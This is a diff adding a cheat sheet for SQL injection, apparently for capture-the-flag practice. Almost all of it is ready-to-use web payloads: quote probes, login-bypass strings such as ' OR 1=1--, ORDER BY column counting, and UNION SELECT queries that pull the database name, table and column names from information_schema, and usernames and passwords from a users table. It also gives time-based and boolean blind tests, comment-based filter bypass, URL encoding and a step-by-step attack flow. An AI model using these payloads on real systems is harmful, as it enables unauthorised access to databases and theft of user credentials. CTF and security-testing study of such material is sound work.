@@ -1,0 +1,181 @@
+========================================
+SQL INJECTION (CTF CHEATSHEET)
+========================================
+
+[HOW TO IDENTIFY SQLi]
+- Input breaks with ' or "
+- Error messages shown
+- Login bypass possible
+- URL like: ?id=1
+
+========================================
+🔥 BASIC TEST
+========================================
+
+'
+"
+` 
+
+If error → possible SQLi
+
+========================================
+🔐 LOGIN BYPASS
+========================================
+
+admin' --
+admin' #
+' OR 1=1--
+' OR '1'='1
+' OR 1=1#
+
+Username: admin
+Password: anything
+
+========================================
+📊 FIND NUMBER OF COLUMNS
+========================================
+
+ORDER BY 1--
+ORDER BY 2--
+ORDER BY 3--
+
+Increase until error → last valid = column count
+
+========================================
+🔎 UNION BASED SQLi
+========================================
+
+' UNION SELECT 1,2,3--
+' UNION SELECT null,null,null--
+
+Try replacing numbers to find reflected column
+
+========================================
+📍 FIND WORKING COLUMN
+========================================
+
+' UNION SELECT 1,2,3--
+→ See where output appears
+
+Example:
+' UNION SELECT 1,'test',3--
+
+========================================
+🧾 EXTRACT DATABASE INFO
+========================================
+
+' UNION SELECT 1,database(),3--
+' UNION SELECT 1,version(),3--
+' UNION SELECT 1,user(),3--
+
+========================================
+📂 GET TABLE NAMES
+========================================
+
+' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+
+========================================
+📄 GET COLUMN NAMES
+========================================
+
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+
+========================================
+🔑 DUMP DATA
+========================================
+
+' UNION SELECT 1,username,password FROM users--
+
+========================================
+🕵️ ERROR BASED SQLi
+========================================
+
+' AND 1=1--
+' AND 1=2--
+
+True → works
+False → breaks
+
+========================================
+⏱️ BLIND SQLi (TIME BASED)
+========================================
+
+' AND SLEEP(5)--
+' OR SLEEP(5)--
+
+If delay → vulnerable
+
+========================================
+🔁 BOOLEAN BASED BLIND
+========================================
+
+' AND 1=1--
+' AND 1=2--
+
+Compare responses
+
+========================================
+🧩 FILTER BYPASS
+========================================
+
+' OR 1=1--
+'/**/OR/**/1=1--
+' OR '1'='1
+admin' #
+
+========================================
+🔒 COMMENT STYLES
+========================================
+
+--
+#
+/**/
+
+========================================
+📌 URL ENCODE (if needed)
+========================================
+
+' → %27
+space → %20
+
+Example:
+%27%20OR%201=1--
+
+========================================
+🚀 QUICK FLOW (IMPORTANT)
+========================================
+
+1. Try '
+2. Try login bypass
+3. Find columns (ORDER BY)
+4. Use UNION SELECT
+5. Find working column
+6. Extract DB → tables → columns → data
+
+========================================
+🔥 QUICK PAYLOAD SET
+========================================
+
+' OR 1=1--
+admin' --
+' UNION SELECT null,null--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,database(),3--
+' UNION SELECT 1,table_name,3 FROM information_schema.tables--
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,username,password FROM users--
+
+========================================
+RULES
+========================================
+
+- ALWAYS TRY SIMPLE FIRST
+- LOOK FOR REFLECTION
+- DON'T OVERTHINK
+- SQLi = PATTERN GAME
+
+========================================
+
+
+
+
